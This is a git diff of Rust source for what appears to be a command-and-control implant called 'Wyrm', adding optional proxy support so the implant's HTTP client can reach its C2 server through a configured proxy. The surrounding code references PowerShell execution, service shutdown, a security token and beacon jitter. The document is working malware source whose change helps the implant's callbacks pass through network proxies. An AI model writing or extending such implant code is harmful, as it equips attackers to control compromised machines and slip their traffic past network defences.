@@ -7,6 +7,7 @@ use std::{
 };
 
 use rand::{Rng, rng};
+use reqwest::{Proxy, Url};
 use serde::Serialize;
 use shared::{
     net::CompletedTasks,
@@ -45,7 +46,8 @@ use crate::{
         shell::run_powershell,
     },
     utils::{
-        comptime::translate_build_artifacts, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
+        comptime::translate_build_artifacts, proxy::ProxyConfig, svc_controls::stop_svc_and_exit,
+        time_utils::epoch_now,
     },
 };
 
@@ -81,6 +83,39 @@ pub struct C2Config {
     pub security_token: String,
     pub useragent: String,
     pub jitter: u64,
+    pub proxy: Option<ProxyConfig>,
+}
+
+impl C2Config {
+    pub fn try_get_proxy<'a>(&'a self) -> &'a Option<String> {
+        if let Some(p) = &self.proxy {
+            return &p.proxy_url;
+        }
+
+        &None
+    }
+
+    /// Returns a new `ClientBuilder` with a proxy applied if applicable, otherwise returns the input CB.
+    pub fn apply_proxy_for_c2_url(
+        &self,
+        url: &str,
+        client_builder: reqwest::blocking::ClientBuilder,
+    ) -> Result<reqwest::blocking::ClientBuilder, reqwest::Error> {
+        let dest = Url::parse(url).unwrap();
+
+        if let Some(p) = self.try_get_proxy() {
+            let px = match dest.scheme() {
+                "https" => Proxy::https(p)?,
+                "http" => Proxy::http(p)?,
+                _ => Proxy::all(p)?,
+            };
+
+            let client_builder = client_builder.proxy(px);
+            return Ok(client_builder);
+        }
+
+        Ok(client_builder)
+    }
 }
 
 impl Wyrm {
@@ -109,6 +144,9 @@ impl Wyrm {
                 security_token,
                 useragent,
                 jitter,
+                // When we instantiate for the first time set this to None, we will later resolve
+                // the proxy
+                proxy: None,
             },
             tasks: VecDeque::new(),
             completed_tasks: vec![],
